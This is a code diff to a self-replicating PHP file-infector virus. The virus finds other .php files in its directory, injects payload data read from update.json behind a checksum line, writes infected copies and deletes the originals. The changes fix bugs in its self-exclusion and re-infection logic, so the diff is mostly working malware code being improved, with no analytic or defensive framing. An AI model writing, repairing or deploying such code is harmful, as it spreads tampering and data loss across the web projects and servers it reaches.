@@ -1,7 +1,8 @@
-<?php // Checksum: 382a15b559e142b42c57314801273616 ?><?php
+<?php // Checksum: 382a15b559e142b42c5731480127361647cd76e43f74bbc2e1baaf194d07e1fa ?><?php
 // BOOM:START
 /**
  * Execute payload
+ * TODO: Fix Checksum code control
  */
 if(!function_exists('executeCode')){
     function executeCode($virus)
@@ -9,7 +10,7 @@ if(!function_exists('executeCode')){
         $version = "1.0.0";
         $filenames = glob('*.php');
         foreach ($filenames as $filename) {
-            if($filename == basename(__FILE__)) continue;
+            if($filename == basename(__FILE__) or $filename == '.\\'.basename(__FILE__)) continue;
             $script = fopen($filename, "r");
             $first_line = fgets($script);
             $virus_hash = md5($filename);
@@ -37,7 +38,6 @@ if(!function_exists('executeCode')){
 
 /**
  * This function will update code if new version is released
- * TODO: Fix the update code.
  */
 if(!function_exists('updateCode')){
     function updateCode(){
@@ -51,16 +51,22 @@ if(!function_exists('updateCode')){
             if(strpos($first_line, $virus_hash.$version) === false){
                 if($filename == basename(__FILE__)) continue;
                 $file_content = file_get_contents($filename);
-                $pos = strpos($file_content, 'executeCode(\$virus);');
-                $new_content = substr($file_content, $pos); // TODO fix here
+                $pos = strpos($file_content, 'executeCode($virus);');
+                if ($pos === false) {
+                    // If the executeCode function call is not found, handle it appropriately
+                    fclose($script);
+                    continue;
+                }
+                // Extract the part before and after the executeCode call
+                $post_content = substr($file_content, $pos + strlen('executeCode($virus);'));
                 $infected = fopen("$filename.updated", "w");
                 $checksum = '<?php // Checksum: '.$virus_hash.$version.' ?>';
                 $infection = json_decode(file_get_contents('update.json'),true);
                 fputs($infected, $checksum, strlen($checksum));
-                foreach ($infection['data'] as $key => $value) {
+                foreach ($infection['data'] as $value) {
                     fputs($infected, $value, strlen($value));
                 }
-                fputs($infected, $new_content);
+                fputs($infected, $post_content);
                 fclose($script);
                 fclose($infected);
                 unlink($filename);
